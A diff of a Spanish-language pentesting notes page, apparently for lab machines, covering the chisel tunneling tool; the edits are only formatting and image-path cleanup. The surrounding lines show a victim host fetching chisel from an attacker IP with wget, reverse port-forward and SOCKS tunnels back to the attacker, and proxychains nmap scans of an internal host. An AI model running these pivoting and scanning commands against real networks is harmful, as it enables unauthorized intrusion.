@@ -20,7 +20,7 @@ go build -ldflags "-s -w" .
 
 > Vamos a los releases y descargamos la versión que queramos (_**linux\_amd64.gz**_)
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>
 
 > Ahora solo descomprimimos
 
@@ -56,8 +56,6 @@ wget http://10.10.14.16/chisel
 
 #### Compartir chisel - curl
 
-
-
 ***
 
 ### Uso
@@ -76,7 +74,7 @@ En la maquina victima, doy permisos de ejecución `chmod +x chisel` a chisel y m
 ./chisel client IP_ATTACKER:1234 R:8080:10.10.10.128:80
 ```
 
-> El `R:8080:10.10.10.128:80` dice R: el 80 (puerto de mi maquina de atacante (puede ser el que sea)),  quiero que me vuelques lo tiene la ip 10.10.10.128 en su puerto 80. Así que si nos vamos a nuestro http://localhost;8080 deberíamos ver el contenido de 10.10.10.128 haciendo un tuneling a través de la 192.168.18.213 (MAGIA)
+> El `R:8080:10.10.10.128:80` dice R: el 80 (puerto de mi maquina de atacante (puede ser el que sea)), quiero que me vuelques lo tiene la ip 10.10.10.128 en su puerto 80. Así que si nos vamos a nuestro http://localhost;8080 deberíamos ver el contenido de 10.10.10.128 haciendo un tuneling a través de la 192.168.18.213 (MAGIA)
 >
 > A veces es necesario utilizar "releases" del git de chisel mas antiguos (según la maquina)
 
@@ -94,6 +92,6 @@ En la maquina victima, doy permisos de ejecución `chmod +x chisel` a chisel y m
 ./chisel client 192.168.18.215:1234 R:socks
 ```
 
-> A la hora de lanzar comandos, hay que poner primero `proxychains`&#x20;
+> A la hora de lanzar comandos, hay que poner primero `proxychains`
 >
 > EJ: `proxychains nmap --top-ports 1000 -sT --open -T5 -v -n -Pn 10.10.10.128 2>&1 | grep -vE "timeout|OK"`
